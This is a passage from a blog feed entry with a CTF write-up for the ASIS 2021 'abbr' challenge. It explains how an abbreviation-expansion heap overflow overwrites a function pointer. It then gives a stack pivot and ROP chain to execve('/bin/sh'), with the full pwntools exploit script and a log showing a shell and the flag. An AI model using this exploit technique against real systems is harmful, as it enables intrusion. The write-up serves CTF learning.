   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;wrt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;with regard to&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;ymmd&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;you made my day&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;icymi&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in case you missed it&#34;</span><span class="p">},</span>
   <span class="c1">// pwners abbreviations
</span><span class="c1"></span>   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;rop &#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;return oriented programming &#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;jop &#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;jump oriented programming &#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;cop &#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;call oriented programming &#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aar&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;arbitrary address read&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aaw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;arbitrary address write&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;www&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;write what where&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;oob&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;out of bounds&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;ret2&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;return to &#34;</span><span class="p">},</span>
  <span class="p">};</span>
</code></pre></div><p>The main stuff is in <code>english_expand</code> function which is looking for an abreviation in the user input. If it finds the abbreviation, all the data after the occurence will be written further according to the length of the full expression.
The attack idea is fairly simple, the <code>text</code> variable is allocated right before the <code>Translator</code> structure, and so in the heap they will be contiguous. Given that, we know that if we send 0x1000 bytes in the chunk contained by <code>text</code> and that we put an abbreviation of the right length we can overwrite the <code>translate</code> function pointer.</p>
<p>I will not describe in details how we can find the right size for the abbreviation or the length off the necessary padding.
An interesting abbreviation is the <code>www</code>, which stands for &ldquo;write what where&rdquo; (what a nice abbreviation for a pwner lmao), indeed the expanded expression has a length of 16 bytes.
So we send <code>b&quot;wwwwww&quot; + b&quot;A&quot;*(0x1000-16) + pwn.p64(gadget)</code>, we will overflow the 32 first bytes next the <code>text</code> chunk, and in this rewrite the <code>translator</code> function pointer.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="ropchain-1">
        ROPchain
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#ropchain-1" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain-1">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Once that&rsquo;s done, when the function pointer will be triggered at the next iteration, we will be able to jmp at an arbitrary location.
Lets take a look at the values of the registers when we trigger the function pointer:</p>
<pre tabindex="0"><code> RAX  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
 RBX  0x400530 (_IO_getdelim.cold+29) ◂— 0x0
 RCX  0x459e62 (read+18) ◂— cmp    rax, -0x1000 /* 'H=' */
*RDX  0x405121 (_nl_load_domain+737) ◂— xchg   eax, esp
 RDI  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
 RSI  0x4c9943 (_IO_2_1_stdin_+131) ◂— 0x4cc020000000000a /* '\n' */
 R8   0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
 R9   0x0
 R10  0x49e522 ◂— 'Enter text: '
 R11  0x246
 R12  0x4030e0 (__libc_csu_fini) ◂— endbr64 
 R13  0x0
 R14  0x4c9018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x44fd90 (__strcpy_avx2) ◂— endbr64 
 R15  0x0
 RBP  0x7ffdef1b8230 —▸ 0x403040 (__libc_csu_init) ◂— endbr64 
 RSP  0x7ffdef1b8220 ◂— 0x0
 RIP  0x402036 (main+190) ◂— call   rdx
</code></pre><p><code>$rax</code> points to the newly readen input, same for <code>$r8</code> and <code>$rdi</code> and <code>$rdx</code> contains the location to which we will jmp on.
So we can search gadgets like <code>mov rsp, rax</code>, <code>mov rsp, rdi</code>, <code>mov rsp, r8</code> and so on. But I didn&rsquo;t find any gadgets like that, so I looked for <code>xchg rsp</code> gadgets, and I finally found a <code>xchg eax, esp</code> gadgets ! Since the binary is not PIE based, the heap addresses fit into a 32 bits register, so that&rsquo;s perfect!</p>
<p>Now we can make <code>$rsp</code> to point to the user input, we make a similar ropchain as the last challenge, and that&rsquo;s enough to get a shell!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
<span class="c1"># 0x00000000004126e3 : call qword ptr [rax]</span>
<span class="c1"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span>
<span class="c1"># 0x0000000000405121 : xchg eax, esp ; ret</span>

<span class="n">pld</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;wwwwww&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000405121</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter text: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>

<span class="c1"># 0x000000000045a8f7 : pop rax ; ret</span>
<span class="c1"># 0x0000000000404cfe : pop rsi ; ret</span>
<span class="c1"># 0x00000000004018da : pop rdi ; ret</span>
<span class="c1"># 0x00000000004017df : pop rdx ; ret</span>
<span class="c1"># 0x000000000045684f : mov qword ptr [rdi], rsi ; ret</span>

<span class="n">DATA_SEC</span> <span class="o">=</span> <span class="mh">0x0000000004c90e0</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x00000000004018da</span>
<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x0000000000404cfe</span>
<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x000000000045a8f7</span>
<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x00000000004017df</span>
<span class="n">MOV_PTR_RDI_RSI</span> <span class="o">=</span> <span class="mh">0x000000000045684f</span>
<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004012e3</span> <span class="c1"># syscall</span>

<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">DATA_SEC</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_PTR_RDI_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
</code></pre></div><p>We launch the script with the right arguments and we correctly pop a shell!</p>
<pre tabindex="0"><code>➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 
[*] '/home/nasm/pwn/asis2021/abbr.d/abbr'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 168.119.108.148 on port 10010: Done
/home/nasm/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode
$ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
$ ls
chall
flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
$ cat flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
</code></pre><div class="gblog-post__anchorwrap">
    <h2 id="final-exploit">
        Final exploit
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#final-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Final exploit" href="#final-exploit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfinit</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>


<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;abbr&#39;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py
</span><span class="s1">b* 0x402036
</span><span class="s1">continue
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="c1">#===========================================================</span>
<span class="c1">#                    EXPLOIT GOES HERE</span>
<span class="c1">#===========================================================</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># 000000000048ac90    80 FUNC    GLOBAL DEFAULT    7 _dl_make_stack_executable</span>
<span class="c1"># 0x0000000000422930 : add rsp, 0x10 ; pop rbp ; ret</span>

<span class="c1"># 0x00000000004126e3 : call qword ptr [rax]</span>
<span class="c1"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span>
<span class="c1"># 0x0000000000405121 : xchg eax, esp ; ret</span>

<span class="n">pld</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;wwwwww&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">-</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000405121</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter text: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>

<span class="c1"># 0x000000000045a8f7 : pop rax ; ret</span>
<span class="c1"># 0x0000000000404cfe : pop rsi ; ret</span>
<span class="c1"># 0x00000000004018da : pop rdi ; ret</span>
<span class="c1"># 0x00000000004017df : pop rdx ; ret</span>
<span class="c1"># 0x000000000045684f : mov qword ptr [rdi], rsi ; ret</span>

<span class="n">DATA_SEC</span> <span class="o">=</span> <span class="mh">0x0000000004c90e0</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x00000000004018da</span>
<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x0000000000404cfe</span>
<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x000000000045a8f7</span>
<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x00000000004017df</span>
<span class="n">MOV_PTR_RDI_RSI</span> <span class="o">=</span> <span class="mh">0x000000000045684f</span>
<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004012e3</span> <span class="c1"># syscall</span>

<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">DATA_SEC</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_PTR_RDI_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter text: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>]]></content>
            
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/authors/nasm" term="nasm" label="nasm" />
                            
                        
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/ASIS-CTF" term="ASIS-CTF" label="ASIS CTF" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                             
                                <category scheme="https://nasm.re/tags/oob-write" term="oob-write" label="oob write" />
                             
                                <category scheme="https://nasm.re/tags/2021" term="2021" label="2021" />
                            
                        
                    
                
            
        </entry>
    
</feed>
